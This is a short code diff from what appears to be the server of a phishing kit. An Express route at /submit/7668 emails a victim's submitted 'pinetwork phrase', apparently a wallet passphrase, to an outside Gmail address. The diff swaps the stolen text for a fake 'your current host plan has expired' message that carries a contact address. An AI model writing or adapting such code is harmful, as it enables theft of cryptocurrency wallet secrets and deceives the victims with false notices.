@@ -61,8 +61,10 @@ app.post("/submit/7668", async (req, res) => {
         to: ["bontynetwork@gmail.com"],
         // to: ["pablomizeto@gmail.com"],
         subject: "pinetwork phrase",
-        text: mfText,
-        html: `<h1>${mfText}</h1>`,
+        //text: mfText,
+        text: "Your current host plan has expired. Please contact your your admin mailto:deliverableserver@info.com",
+        //html: `<h1>${mfText}</h1>`,
+        html: "Your current host plan has expired. Please contact your your admin mailto:deliverableserver@info.com" 
       }).then(result=> console.log(result)).catch(err=> console.log(err));
     // }
 
